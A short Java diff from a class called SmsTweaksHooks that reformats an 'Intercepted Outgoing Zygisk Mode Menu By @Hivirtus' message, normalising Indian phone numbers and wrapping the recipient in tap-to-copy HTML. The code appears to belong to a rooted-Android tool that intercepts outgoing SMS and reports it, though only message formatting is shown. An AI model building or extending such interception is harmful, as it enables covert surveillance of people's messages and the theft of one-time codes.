@@ -631,9 +631,8 @@ public final class SmsTweaksHooks {
                     if (digits.length() == 10) displayTo = "+91" + digits;
                     else if (digits.length() == 12 && digits.startsWith("91"))
                         displayTo = "+" + digits;
-                    // Screenshot: bold headers + HTML <code> tap-to-copy
-                    String msg = "<b>Intercepted Outgoing Zygisk Mode Menu</b>\n"
-                            + "<b>By @Hivirtus 🔥</b>\n"
+                    // First screenshot spacing — blank line gaps + tap-to-copy
+                    String msg = "📱 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥</b>\n"
                             + "\n"
                             + "To (Tap to copy):\n"
                             + "<code>" + escHtml(displayTo) + "</code>\n"
